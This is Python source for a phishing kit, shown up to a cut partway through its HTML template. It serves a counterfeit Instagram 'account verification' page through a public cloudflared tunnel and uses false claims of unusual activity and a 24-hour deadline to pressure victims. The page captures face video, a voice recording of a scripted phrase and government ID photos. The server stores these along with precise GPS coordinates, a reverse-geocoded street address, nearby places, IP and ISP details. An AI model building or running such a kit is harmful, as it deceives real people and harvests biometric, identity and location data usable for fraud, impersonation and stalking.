import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic
from io import BytesIO

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy", "Pillow": "PIL"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_username():
    """Generate a random Instagram-like username."""
    first_names = ["alex", "sam", "jordan", "taylor", "casey", "morgan", "riley", "avery", "charlie", "skyler", 
                   "jamie", "quinn", "blake", "parker", "drew", "cameron", "hayden", "payton", "reese", "rowan"]
    last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez",
                 "hernandez", "lopez", "gonzalez", "wilson", "anderson", "thomas", "taylor", "moore", "jackson", "martin"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    number = random.randint(10, 999)
    
    username_variants = [
        f"{first}_{last}{number}",
        f"{first}.{last}",
        f"official_{first}{number}",
        f"real_{first}_{last}",
        f"{first}{last}",
        f"{first[0]}{last}{number}",
        f"its{first}{number}",
        f"just{first}",
        f"the{last}",
        f"{first}the{last}"
    ]
    
    return random.choice(username_variants)

def find_profile_picture(folder):
    """Search for an image file in the folder to use as profile picture."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                # Read the image file and convert to base64
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    # Determine MIME type based on extension
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Error reading profile picture {file}: {e}")
    
    return None

def get_verification_settings():
    """Get user preferences for verification process."""
    print("\n" + "="*60)
    print("INSTAGRAM VERIFICATION SETUP")
    print("="*60)
    
    # Get target username
    print("\n[+] TARGET USERNAME SETUP")
    print("Enter the Instagram username to display in the verification page")
    print("Leave blank for random username generation")
    
    username_input = input("Target username (or press Enter for random): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_random_username()
        settings = {'target_username': random_username}
        print(f"[+] Generated random username: {random_username}")
    
    # Look for profile picture
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Found profile picture: {profile_pic['filename']}")
        print(f"[+] Using profile picture for @{settings['target_username']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] No profile picture found in folder")
        print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"\n[+] Verification will appear for: @{settings['target_username']}")
    
    # Face scan duration
    print("\n1. Face Scan Duration:")
    print("How many seconds for face movement verification?")
    print("Recommended: 15-30 seconds for complete head movements")
    
    while True:
        try:
            duration = input("Duration in seconds (5-60, default: 20): ").strip()
            if not duration:
                settings['face_duration'] = 20
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Please enter a number between 5 and 60.")
        except ValueError:
            print("Please enter a valid number.")
    
    # Voice verification duration
    print("\n2. Voice Verification:")
    print("Enable voice verification after face scan?")
    voice_enabled = input("Enable voice verification (y/n, default: y): ").strip().lower()
    settings['voice_enabled'] = voice_enabled in ['y', 'yes', '']
    
    if settings['voice_enabled']:
        print("\nVoice Recording Duration:")
        while True:
            try:
                voice_duration = input("Seconds for voice recording (3-10, default: 5): ").strip()
                if not voice_duration:
                    settings['voice_duration'] = 5
                    break
                voice_duration = int(voice_duration)
                if 3 <= voice_duration <= 10:
                    settings['voice_duration'] = voice_duration
                    break
                else:
                    print("Please enter a number between 3 and 10.")
            except ValueError:
                print("Please enter a valid number.")
    
    # ID verification
    print("\n3. ID Document Verification:")
    print("Require ID document upload?")
    id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    # Location verification
    print("\n4. Location Verification:")
    print("Require location verification?")
    location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="instagram_verification")

def get_ip_info():
    """Get IP-based location information."""
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=3):
    """Return nearby shops/amenities."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"](around:{radius},{latitude},{longitude});
        way["amenity"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []
        
        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
            
            if not lat_elem or not lon_elem:
                continue
            
            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            
            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
            place_name = tags.get("name", "Unnamed Place")
            
            results.append({
                "type": place_type,
                "name": place_name,
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })
        
        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]
        
    except requests.RequestException:
        return []

def process_and_save_location(data, session_id):
    """Process and save location data with metadata."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Get nearby places
        places = get_nearby_places(lat, lon)
        
        # Get IP info
        ip_info = get_ip_info()
        
        # Prepare structured data
        location_data = {
            "verification_type": "location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy'),
                "altitude_m": data.get('altitude'),
                "speed_mps": data.get('speed'),
                "heading_degrees": data.get('heading')
            },
            "address_information": {
                "full_address": full_address,
                "house_number": address_details.get("house_number"),
                "street": address_details.get("road"),
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "postal_code": address_details.get("postcode"),
                "country": address_details.get("country")
            },
            "nearby_places": places,
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Unknown"
            },
            "device_info": {
                "user_agent": data.get('user_agent', 'Unknown'),
                "timestamp_utc": datetime.utcnow().isoformat(),
                "local_timestamp": datetime.now().isoformat()
            }
        }
        
        # Save to file
        filename = f"location_verification_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings
VERIFICATION_SETTINGS = {
    'target_username': 'user_' + str(random.randint(100000, 999999)),
    'face_duration': 20,
    'voice_enabled': True,
    'voice_duration': 5,
    'id_enabled': True,
    'location_enabled': True,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Instagram Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'voice_recordings'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Creates the comprehensive Instagram verification template with location."""
    target_username = settings['target_username']
    face_duration = settings['face_duration']
    voice_enabled = settings['voice_enabled']
    voice_duration = settings['voice_duration'] if voice_enabled else 0
    id_enabled = settings['id_enabled']
    location_enabled = settings['location_enabled']
    profile_picture = settings.get('profile_picture')
    profile_picture_filename = settings.get('profile_picture_filename')
    
    # Calculate total steps
    total_steps = 2  # Introduction + Face
    if voice_enabled:
        total_steps += 1
    if id_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    total_steps += 1  # Final step
    
    # Generate the base template with variables
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification Page</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }}
        
        body {{
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
        }}
        
        .logo h1 {{
            font-family: 'Brush Script MT', cursive;
            font-size: 3.5rem;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }}
        
        .account-info {{
            background-color: #121212;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #363636;
            text-align: center;
        }}
        
        .account-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(45deg, #405DE6, #833AB4, #E1306C);
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
            overflow: hidden;
            border: 3px solid #363636;
        }}
        
        .account-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .account-name {{
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .account-username {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .account-stats {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            font-size: 14px;
        }}
        
        .account-stat {{
            text-align: center;
        }}
        
        .stat-number {{
            font-weight: 600;
            color: #fff;
        }}
        
        .stat-label {{
            color: #a8a8a8;
            font-size: 12px;
        }}
        
        .verification-steps {{
            background-color: #121212;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 20px;
            border: 1px solid #363636;
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #fff;
        }}
        
        .step-subtitle {{
            color: #a8a8a8;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }}
        
        .progress-container {{
            width: 100%;
            height: 4px;
            background-color: #363636;
            border-radius: 2px;
            margin-bottom: 30px;
            overflow: hidden;
        }}
        
        .progress-bar {{
            height: 100%;
            background: linear-gradient(90deg, #405DE6, #833AB4, #E1306C);
            width: 0%;
            transition: width 0.3s;
        }}
        
        .progress-steps {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }}
        
        .progress-step {{
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background-color: #363636;
            color: #a8a8a8;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            position: relative;
            z-index: 2;
        }}
        
        .progress-step.active {{
            background: linear-gradient(45deg, #405DE6, #833AB4);
            color: white;
        }}
        
        .progress-step.completed {{
            background-color: #405DE6;
            color: white;
        }}
        
        .progress-line {{
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            height: 2px;
            background-color: #363636;
            z-index: 1;
        }}
        
        .progress-line-fill {{
            position: absolute;
            top: 12px;
            left: 12px;
            height: 2px;
            background: linear-gradient(90deg, #405DE6, #833AB4);
            z-index: 1;
            width: 0%;
            transition: width 0.3s;
        }}
        
        /* Face Verification Styles */
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 30px;
            border-radius: 50%;
            overflow: hidden;
            background-color: #000;
            border: 3px solid #363636;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid #405DE6;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
        }}
        
        .instruction-container {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .instruction-text {{
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
            color: #405DE6;
        }}
        
        .instruction-detail {{
            font-size: 14px;
            color: #a8a8a8;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 32px;
            text-align: center;
            margin-bottom: 15px;
        }}
        
        .timer {{
            text-align: center;
            font-size: 32px;
            font-weight: 600;
            color: #405DE6;
            margin-bottom: 20px;
            font-family: monospace;
        }}
        
        /* Voice Verification Styles */
        .voice-instruction {{
            background-color: rgba(233, 89, 80, 0.1);
            border: 1px solid #E95950;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
        }}
        
        .phrase-box {{
            background-color: #000;
            border: 2px solid #363636;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .phrase-text {{
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 10px;
        }}
        
        .phrase-subtext {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .voice-visualizer {{
            width: 100%;
            height: 100px;
            background-color: #000;
            border-radius: 8px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .voice-wave {{
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 50%;
            background: linear-gradient(to top, rgba(64, 93, 230, 0.3), rgba(233, 89, 80, 0.3));
        }}
        
        /* ID Verification Styles */
        .id-upload-container {{
            display: flex;
            flex-direction: column;
            gap: 25px;
            margin-bottom: 30px;
        }}
        
        .id-card {{
            background-color: #000;
            border: 2px dashed #363636;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .id-card:hover {{
            border-color: #405DE6;
            background-color: rgba(64, 93, 230, 0.05);
        }}
        
        .id-card.dragover {{
            border-color: #405DE6;
            background-color: rgba(64, 93, 230, 0.1);
        }}
        
        .id-icon {{
            font-size: 48px;
            margin-bottom: 15px;
            color: #405DE6;
        }}
        
        .id-title {{
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
        }}
        
        .id-subtitle {{
            color: #a8a8a8;
            font-size: 14px;
            margin-bottom: 15px;
        }}
        
        .id-requirements {{
            font-size: 12px;
            color: #888;
            text-align: left;
            margin-top: 20px;
        }}
        
        .id-requirements ul {{
            padding-left: 20px;
            margin-top: 10px;
        }}
        
        /* Location Verification Styles */
        .location-container {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .location-icon {{
            font-size: 72px;
            margin-bottom: 20px;
            color: #34A853;
        }}
        
        .location-info {{
            background-color: rgba(52, 168, 83, 0.1);
            border: 1px solid #34A853;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }}
        
        .location-details {{
            background-color: #000;
            border: 1px solid #363636;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: left;
            display: none;
        }}
        
        .location-detail-item {{
            margin-bottom: 10px;
            font-size: 14px;
        }}
        
        .location-detail-label {{
            color: #a8a8a8;
            display: inline-block;
            width: 120px;
        }}
        
        .location-detail-value {{
            color: #fff;
        }}
        
        .accuracy-meter {{
            width: 100%;
            height: 20px;
            background-color: #363636;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
        }}
        
        .accuracy-fill {{
            height: 100%;
            background: linear-gradient(90deg, #EA4335, #FBBC05, #34A853);
            width: 0%;
            transition: width 1s ease-in-out;
        }}
        
        .accuracy-labels {{
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #a8a8a8;
            margin-top: 5px;
        }}
        
        /* Common Styles */
        .button {{
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-bottom: 15px;
        }}
        
        .primary-btn {{
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4);
            color: white;
        }}
        
        .primary-btn:hover {{
            opacity: 0.9;
        }}
        
        .primary-btn:disabled {{
            opacity: 0.5;
            cursor: not-allowed;
        }}
        
        .secondary-btn {{
            background-color: #363636;
            color: white;
        }}
        
        .secondary-btn:hover {{
            background-color: #444;
        }}
        
        .status-message {{
            text-align: center;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }}
        
        .status-success {{
            background-color: rgba(76, 175, 80, 0.1);
            border: 1px solid #4CAF50;
            color: #4CAF50;
        }}
        
        .status-error {{
            background-color: rgba(244, 67, 54, 0.1);
            border: 1px solid #F44336;
            color: #F44336;
        }}
        
        .status-processing {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            color: #FFC107;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #363636;
        }}
        
        .footer-links a {{
            color: #a8a8a8;
            text-decoration: none;
            font-size: 12px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        .info-box {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #FFC107;
        }}
        
        .info-box strong {{
            color: #fff;
        }}
        
        .file-input {{
            display: none;
        }}
        
        .preview-container {{
            margin-top: 15px;
            display: none;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid #363636;
        }}
        
        /* Completion Page Styles */
        .completion-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .success-icon {{
            font-size: 80px;
            margin-bottom: 30px;
            color: #4CAF50;
        }}
        
        .checkmark {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, #4CAF50, #8BC34A);
            margin: 0 auto 30px;
            position: relative;
            animation: popIn 0.5s ease-out;
        }}
        
        .checkmark::before {{
            content: "✓";
            color: white;
            font-size: 60px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }}
        
        @keyframes popIn {{
            0% {{ transform: scale(0.5); opacity: 0; }}
            70% {{ transform: scale(1.1); opacity: 1; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .account-access {{
            background: linear-gradient(45deg, #405DE6, #833AB4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 20px;
        }}
        
        .features-list {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
            text-align: left;
        }}
        
        .features-list li {{
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }}
        
        .feature-icon {{
            margin-right: 15px;
            font-size: 20px;
            color: #4CAF50;
        }}
        
        .next-steps {{
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #363636;
        }}
        
        /* Under Review Page Styles */
        .review-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .review-icon {{
            font-size: 80px;
            margin-bottom: 30px;
            color: #FFC107;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.05); opacity: 0.8; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .review-clock {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, #FFC107, #FF9800);
            margin: 0 auto 30px;
            position: relative;
            animation: rotate 60s linear infinite;
        }}
        
        .review-clock::before {{
            content: "⏳";
            color: white;
            font-size: 50px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }}
        
        @keyframes rotate {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .review-timeline {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
        }}
        
        .timeline-item {{
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        .timeline-item:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .timeline-icon {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #FFC107;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }}
        
        .timeline-content {{
            flex: 1;
            text-align: left;
        }}
        
        .timeline-title {{
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .timeline-description {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .contact-info {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 20px;
            margin: 30px 0;
        }}
        
        .contact-item {{
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }}
        
        .contact-item:last-child {{
            margin-bottom: 0;
        }}
        
        .contact-icon {{
            margin-right: 15px;
            font-size: 20px;
            color: #405DE6;
        }}
        
        .contact-text {{
            text-align: left;
            flex: 1;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Instagram</h1>
        </div>
        
        <!-- Account Info Section -->
        <div class="account-info">
            <div class="account-avatar">
                {'<img src="' + profile_picture + '">' if profile_picture else target_username[0].upper()}
            </div>
            <div class="account-name">@{target_username}</div>
            <div class="account-username">Account Verification Required</div>
            
            <div class="account-stats">
                <div class="account-stat">
                    <div class="stat-number">{random.randint(100, 999)}</div>
                    <div class="stat-label">Posts</div>
                </div>
                <div class="account-stat">
                    <div class="stat-number">{random.randint(1000, 9999)}</div>
                    <div class="stat-label">Followers</div>
                </div>
                <div class="account-stat">
                    <div class="stat-number">{random.randint(500, 5000)}</div>
                    <div class="stat-label">Following</div>
                </div>
            </div>
        </div>
        
        <div class="verification-steps">
            <!-- Progress Indicator -->
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="progress-steps">
                <div class="progress-line"></div>
                <div class="progress-line-fill" id="progressLineFill"></div>
                <div class="progress-step completed" id="step1Indicator">1</div>
                <div class="progress-step active" id="step2Indicator">2</div>
                <div class="progress-step" id="step3Indicator">3</div>
                <div class="progress-step" id="step4Indicator">4</div>
                <div class="progress-step" id="step5Indicator">5</div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step active" id="step1">
                <h2 class="step-title">Account Verification Required</h2>
                <p class="step-subtitle">
                    <strong>@{target_username}</strong>, to comply with Instagram's security policies and restore full account access, 
                    we need to verify your identity. This helps protect your account from unauthorized access.
                </p>
                
                <div class="info-box">
                    <strong>Why is this required?</strong><br>
                    We've detected unusual activity on your account @{target_username}. 
                    To prevent unauthorized access and keep your account secure, verification is required.
                </div>
                
                <div class="instruction-container">
                    <div class="instruction-icon">🔒</div>
                    <div class="instruction-text">Complete Verification Steps:</div>
                    <div class="instruction-detail">
                        1. <strong>Face Scan</strong> - Follow head movement instructions<br>
                        2. <strong>Voice Verification</strong> - Read a short phrase<br>
                        3. <strong>ID Document</strong> - Upload government-issued ID<br>
                        4. <strong>Location</strong> - Verify your current location
                    </div>
                </div>
                
                <div class="instruction-container">
                    <div class="instruction-icon">⏱️</div>
                    <div class="instruction-text">Complete within 24 hours</div>
                    <div class="instruction-detail">
                        Your account @{target_username} will be temporarily limited until verification is completed.
                    </div>
                </div>
                
                <button class="button primary-btn" onclick="nextStep()">
                    Start Verification for @{target_username}
                </button>
            </div>
            
            <!-- Step 2: Face Verification -->
            <div class="step" id="step2">
                <h2 class="step-title">Face Verification</h2>
                <p class="step-subtitle">
                    We'll scan your face to verify your identity. Follow the on-screen instructions carefully.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="instruction-container" id="faceInstruction">
                    <div class="instruction-icon" id="instructionIcon">👤</div>
                    <div class="instruction-text" id="instructionText">Get Ready</div>
                    <div class="instruction-detail" id="instructionDetail">
                        Position your face within the circle and wait for instructions
                    </div>
                </div>
                
                <button class="button primary-btn" id="startFaceScanBtn" onclick="startFaceVerification()">
                    Start Face Scan for @{target_username}
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 3: Voice Verification -->
            <div class="step" id="step3">
                <h2 class="step-title">Voice Verification</h2>
                <p class="step-subtitle">
                    Please read the phrase below clearly. This helps verify you're the real owner of @{target_username}.
                </p>
                
                <div class="voice-instruction">
                    <div class="instruction-icon">🎤</div>
                    <div class="instruction-text">Read This Phrase</div>
                    <div class="instruction-detail">Speak clearly at normal volume</div>
                </div>
                
                <div class="phrase-box">
                    <div class="phrase-text" id="voicePhrase">My name is {target_username} and I am verifying my identity with Instagram</div>
                    <div class="phrase-subtext">Say this phrase clearly into your microphone</div>
                </div>
                
                <div class="voice-visualizer">
                    <div class="voice-wave" id="voiceWave"></div>
                </div>
                
                <div class="timer" id="voiceTimer">00:{str(voice_duration).zfill(2)}</div>
                
                <button class="button primary-btn" id="startVoiceBtn" onclick="startVoiceVerification()">
                    Start Voice Recording
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 4: ID Verification -->
            <div class="step" id="step4">
                <h2 class="step-title">ID Document Verification</h2>
                <p class="step-subtitle">
                    Upload photos of your government-issued ID to verify account ownership for @{target_username}.
                </p>
                
                <div class="id-upload-container">
                    <div class="id-card" onclick="document.getElementById('frontIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleFileDrop(event, 'front')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Front of ID</div>
                        <div class="id-subtitle">Driver's License, Passport, or National ID</div>
                        <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'front')">
                        <div class="preview-container" id="frontPreview">
                            <img class="preview-image" id="frontPreviewImage">
                        </div>
